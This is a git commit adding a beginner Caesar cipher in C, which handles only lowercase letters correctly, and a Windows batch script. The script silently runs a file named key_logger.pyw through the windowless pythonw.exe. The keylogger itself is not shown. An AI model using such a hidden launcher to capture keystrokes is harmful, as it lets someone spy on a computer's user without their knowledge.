970d8e6e5dfa1e7faa17ada09f755daec01cf280
Shashank Pawsekar <77888079+Shashank-Pawsekar@users.noreply.github.com>
2023-10-05 17:27:56 +0530

    Add files via upload

---
+++ Project/CC.c
@@ -0,0 +1,42 @@
+#include<stdio.h>// fget(), stdin
+#include<string.h>//stringlen()
+#include<stdlib.h>
+
+//Define my Caesar Cipher Function
+void caesarCipher(char* plainText, int key);
+
+int main(void){
+	
+	int key = 1;
+	char plainText[101];
+	
+	//Ask the user for the plain text to encrypt
+	printf("Please enter the plain text you want to encrypt: ");
+	
+	//Get the users text input and store it in plainText variable
+	fgets(plainText, sizeof(plainText), stdin);
+	
+	//Print the ciphered text
+	printf("The ciphered text is : ");
+	
+	//Print the ciphered text
+	caesarCipher(plainText, key);
+	
+	system("pause"); // Comment out if you are not using windows OS
+}
+
+void caesarCipher(char* plainText, int key){
+	
+	int i=0;
+	int cypherValue;
+	char cypher;
+	
+	while( plainText[i] != '\0' && strlen(plainText)-1 > i){
+		cypherValue = ((int)plainText[i] -97 + key) % 26 + 97;
+		cypher = (char)(cypherValue);
+		
+		printf("%c", cypher);
+		i++;
+	}
+	printf("\n");
+}
---
+++ Project/script.bat
@@ -0,0 +1,4 @@
+@ECHO OFF
+
+C:\Users\Asus\AppData\Local\Programs\Python\Python38-32\pythonw.exe 
+%CD%\key_logger.pyw %*
